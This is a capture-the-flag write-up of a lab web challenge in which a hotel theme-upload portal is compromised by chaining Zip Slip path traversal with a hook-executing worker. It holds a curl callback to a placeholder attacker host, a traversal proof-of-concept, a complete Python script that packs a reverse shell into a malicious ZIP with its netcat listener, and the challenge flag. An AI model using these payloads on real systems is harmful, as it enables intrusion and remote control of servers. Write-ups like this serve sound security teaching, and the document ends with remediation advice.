# The Hollow Shell — Hacker Holidays: The Byte Lotus Hotel

**Category:** Web **Difficulty:** Medium **Points:** 90 **Author:** Obito Uchiha — Team AKATSUKI

---

## 🛎️ Challenge Brief

> You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.

The Byte Lotus beachfront lets guests personalise their in-room display by uploading a **shell** — a zipped "souvenir pack" of shoreline ambiance assets. Staff publish these through the **Shoreline Display portal**, and once a shell is "held to the room's ear," a theme worker processes it. The vulnerability lies in what the portal _forgets to check_ when extracting the uploaded archive.

---

## 🔍 Recon

### Nmap scan

```bash
nmap -Pn -sC -sV 10.130.190.24
```

**Results:**

|Port|Service|
|---|---|
|22/tcp|SSH|
|5000/tcp|HTTP|

### Web portal

```
http://10.130.190.24:5000
```

Credentials disclosed in the briefing:

```
user: concierge
pass: StayNoticed2024!
```

Logging in reveals the **Shoreline Display portal**, where staff can upload a ZIP archive containing a shell package. Each shell must include a `shell.json` manifest listing its assets (images, stylesheets, etc.).

Allowed asset types: `png`, `jpg`, `gif`, `svg`, `css`, `json`.

Notably, the portal also supports **optional automation hooks** — commands that a background "theme worker" applies shortly after a shell is uploaded.

---

## 🧪 Step 1 — Baseline Upload

Confirming a minimal valid shell works:

```bash
printf '%s\n' '{"name":"test","assets":[]}' > shell.json
zip baseline.zip shell.json
```

Uploading `baseline.zip` succeeds, and the manifest is served back at:

```
http://10.130.190.24:5000/shells/7676d3b098d2/shell.json
```

This confirms each upload gets extracted into a unique per-shell directory under `shells/`.

---

## 🧪 Step 2 — Discovering the Hooks Feature

The manifest schema accepts an optional `hooks` array. Testing different shapes:

```json
"hooks": []
"hooks": ["test"]
"hooks": [{}]
"hooks": ["id", "whoami"]
```

To confirm hooks actually execute server-side (rather than just being stored), an out-of-band callback test was used:

```json
{
  "name": "callback-test",
  "assets": [],
  "hooks": [
    "curl http://ATTACKER-IP:8000/"
  ]
}
```

A listener (`python3 -m http.server 8000` or `nc -lvnp 8000`) receives the callback — **confirming hooks are executed as shell commands by the theme worker** shortly after upload. This is the primary RCE primitive, but it's gated behind wherever the worker executes from — so the real question becomes: _can we control where files land on disk?_

---

## 🧪 Step 3 — Proving Zip Slip

**Zip Slip** occurs when an archive extractor writes entries to disk using their raw path _without validating that the resolved path stays inside the intended extraction directory_. A path like:

```
../../static/proof.css
```

escapes the per-shell folder and writes directly into the application's shared `static/` directory.

### Proof-of-concept script

```python
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```

Verifying the crafted archive contains the traversal entry:

```bash
unzip -l zipslip-proof.zip
```

```
Archive:  zipslip-proof.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       39  2026-08-05 19:32   shell.json
       19  2026-08-05 19:32   ../../static/zipslip-proof.css
---------                     -------
       58                     2 files
```

Uploading this archive, then requesting:

```bash
curl http://10.130.181.205:5000/static/zipslip-proof.css
```

Returns:

```
ZIP_SLIP_CONFIRMED
```

✅ **Confirmed:** the extraction routine does not sanitize archive member paths — arbitrary file write anywhere the app's process has permissions.

Mapped application layout:

```
application-root/
├── static/
├── shells/
└── hooks/
```

The `hooks/` directory is the interesting target — since hook commands are executed by the theme worker, writing a malicious script there (or referencing one) turns the **arbitrary write** primitive into **arbitrary code execution**.

---

## 💥 Step 4 — Weaponizing: Zip Slip + Hooks → RCE

### `build_shell.py`

```python
import json
import zipfile

LHOST = "10.130.97.35"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

Build and verify the malicious archive:

```bash
python3 build_shell.py
unzip -l reverse-shell.zip
```

### Catching the shell

Start a listener before uploading:

```bash
nc -lvnp 4444
```

Upload `reverse-shell.zip` through the Shoreline Display portal. The Zip Slip write drops `callback.py` directly into `hooks/`, where the theme worker picks it up and executes it — sending a reverse shell (PTY-spawned bash) back to the attacker.

```
listening on [any] 4444 ...
connect to [10.130.97.35] from (UNKNOWN) [10.130.190.24] XXXXX
$ whoami
```

---

## 🚩 Flag

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## 📝 Note on the "(Patched)" Instance

This target was labeled `(Patched)`. Testing showed the JSON `hooks` array (e.g. `"hooks": ["curl ..."]`) was **no longer executed directly** — that specific vector was mitigated. However, the underlying **Zip Slip flaw in the archive extractor was untouched**, and the theme worker was found to independently scan the `hooks/` directory for `.py` files and execute anything dropped there. So the exploit chain simply shifted:

- ❌ Patched: JSON-declared `hooks` commands executed inline.
- ✅ Still vulnerable: Zip Slip write into `hooks/*.py`, auto-picked-up and executed by the worker on its next cycle.

This is a good reminder that patching one symptom (the explicit hooks field) without fixing the root cause (unsanitized archive extraction) leaves an equivalent path open.

---

## 🧠 Root Cause & Fix

- **Vulnerability class:** Zip Slip (CWE-22, path traversal via archive extraction) chained with an unauthenticated/unsandboxed automation-hook execution feature.
- **Fix:**
    - Validate every archive member's resolved path stays within the intended extraction directory before writing (`os.path.commonpath` check or reject any entry containing `..`).
    - Never execute user-supplied "hooks" as raw shell commands — sandbox, allowlist, or remove the feature entirely.
    - Run the extraction/theme-worker process with least privilege, isolated from `hooks/`.

---

_Solved by Obito Uchiha — Team AKATSUKI 🐚_